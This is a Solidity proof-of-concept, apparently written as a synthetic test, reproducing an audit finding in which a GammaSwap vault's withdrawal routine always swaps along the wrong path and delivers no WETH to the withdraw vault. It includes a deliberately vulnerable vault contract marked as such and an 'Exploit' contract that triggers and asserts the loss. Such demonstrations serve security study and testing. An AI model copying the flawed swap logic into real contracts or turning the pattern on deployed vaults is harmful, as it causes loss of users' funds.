// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  GammaSwap — processWithdrawals always swaps along path1 (Pashov, Dec 2024)
    SYNTHETIC, cheatcode-free. On a deployment where the asset token is token1
    (WETH above USDC, as on Ethereum), the base token is token0 and the sell
    path is path0. The code still passes path1, so the router sells WETH into
    USDC and the withdraw vault receives 0 WETH instead of 200. (@> VULN) */

contract MockToken {
    string public name;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n) {
        name = n;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount; // S4
        balanceOf[to] += amount;
        return true;
    }
}

contract Router {
    function swapExactTokensForTokens(uint256 amount, uint256, bytes calldata path, address to, uint256)
        external
        returns (uint256)
    {
        (address tokenIn, address tokenOut) = abi.decode(path, (address, address));
        MockToken(tokenIn).transferFrom(msg.sender, address(this), amount); // S3
        MockToken(tokenOut).transfer(to, amount);
        return amount;
    }
}

contract GammaVault {
    MockToken public token0;
    MockToken public token1;
    MockToken public assetToken;
    Router public router;
    address public withdrawVault;
    bool public isAssetToken0;

    constructor(MockToken t0, MockToken t1, Router r, address withdrawVault_) {
        token0 = t0;
        token1 = t1;
        assetToken = t1;
        router = r;
        withdrawVault = withdrawVault_;
        isAssetToken0 = false;
        t0.approve(address(r), type(uint256).max);
        t1.approve(address(r), type(uint256).max);
    }

    function processWithdrawals(bytes memory path0, bytes memory path1) external {
        uint256 baseBalance = isAssetToken0 ? token1.balanceOf(address(this)) : token0.balanceOf(address(this)); // S2
        if (baseBalance > 0) {
            router.swapExactTokensForTokens(baseBalance, 0, path1, address(this), type(uint256).max); // @> VULN: S5 path1 even when asset is token1
            uint256 assetBalance = assetToken.balanceOf(address(this));
            assetToken.transfer(withdrawVault, assetBalance);
        }
    }
}

contract Exploit {
    address public constant WITHDRAW_VAULT = 0x000000000000000000000000000000000000D00d;

    MockToken public usdc; // nonce 1
    MockToken public weth; // nonce 2
    Router public router; // nonce 3
    GammaVault public vault; // nonce 4

    uint256 public constant UNIT = 100e18;
    uint256 public received;
    uint256 public routerWeth;

    constructor() {
        usdc = new MockToken("USDC");
        weth = new MockToken("WETH");
        router = new Router();
        vault = new GammaVault(usdc, weth, router, WITHDRAW_VAULT);
        usdc.mint(address(vault), UNIT);
        weth.mint(address(vault), UNIT);
        usdc.mint(address(router), 2 * UNIT);
        weth.mint(address(router), 2 * UNIT);
    }

    function run() external {
        bytes memory path0 = abi.encode(address(usdc), address(weth));
        bytes memory path1 = abi.encode(address(weth), address(usdc));
        vault.processWithdrawals(path0, path1); // S1
        received = weth.balanceOf(WITHDRAW_VAULT); // S6
        routerWeth = weth.balanceOf(address(router));
        require(received == 0, "withdraw vault got WETH");
        require(weth.balanceOf(address(vault)) == 0, "vault still holds WETH");
        require(usdc.balanceOf(address(vault)) == 2 * UNIT, "USDC was not increased by the wrong-way swap");
        require(routerWeth == 3 * UNIT, "router did not take the 100 WETH");
        require(received < 2 * UNIT, "fair delivery would be 200 WETH");
    }
}
